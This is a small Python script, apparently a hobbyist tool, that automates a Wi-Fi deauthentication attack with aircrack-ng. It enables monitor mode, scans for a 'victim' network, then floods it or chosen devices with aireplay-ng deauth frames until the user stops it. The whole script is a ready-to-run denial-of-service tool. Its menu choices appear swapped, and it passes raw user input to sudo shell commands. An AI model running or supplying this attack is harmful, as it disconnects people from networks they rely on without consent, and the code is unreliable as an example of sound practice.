#!/bin/env python3
# @wvverez

import os
import time

R, G, Y, B, X = "\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[0m" # Colores 

os.system("which aircrack-ng > /dev/null 2>&1 || (echo ''; read -p $'\033[31m[+] Aircrack-ng no existe, instalar con apt/snap/pacman o salir? (a/s/p/e): \033[0m' o; [ \"$o\" = a ] && sudo apt install -y aircrack-ng; [ \"$o\" = s ] && sudo apt install -y snapd && sudo snap install aircrack-ng-snap; [ \"$o\" = p ] && sudo pacman -S --noconfirm aircrack-ng; [ \"$o\" = e ] && exit)")

os.system("clear; cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' '")
p = input(f"{Y}[+] Nombre de su tarjeta de red:{X} ")
print(f"{R}[+] Habilitando modo monitor{X}")
os.system(f"sudo airmon-ng start {p} > /dev/null 2>&1; clear")
print(f"{G}[+] Modo monitor ACTIVADO{X}")
os.system("cat /proc/net/dev | awk -F':' '{if (NR>2) print $1}' | tr -d ' '")
p2 = input(f"{Y}[+] Nuevo nombre de su placa de red:{X} ")

os.system(f"sudo airodump-ng --band abg {p2}")
b = input(f"{R}[+] BSSID de la red victima:{X} ")
c = input(f"{R}[+] Channel de la red victima:{X} ")
os.system(f"sudo airodump-ng --band abg --bssid {b} -c {c} {p2}")
q = input(f"{Y}[+] Atacar un dispositivo (r) o toda la red (d):{X} ").lower()

os.system(f"{'sudo aireplay-ng -0 0 -a ' + b + ' ' + p2 if q=='r' else ''} > /dev/null 2>&1 &")
[os.system(f"sudo aireplay-ng -0 0 -a {b} -c {input(f'{R}[+] Station:{X} ')} {p2} > /dev/null 2>&1 &") for _ in range(int(input(f'{R}[+] Cuantos dispositivos?:{X} '))) ] if q=='d' else None
print(f"{B}[+] Atacando{X}")
input(f"{R}[+] Enter para detener...{X}")
os.system("sudo pkill aireplay-ng")

print(f"{G}[+] Saliendo del modo monitor{X}")
os.system(f"sudo airmon-ng stop {p2} > /dev/null 2>&1")
print("[+] Adiós")
time.sleep(3)
os.system("clear")
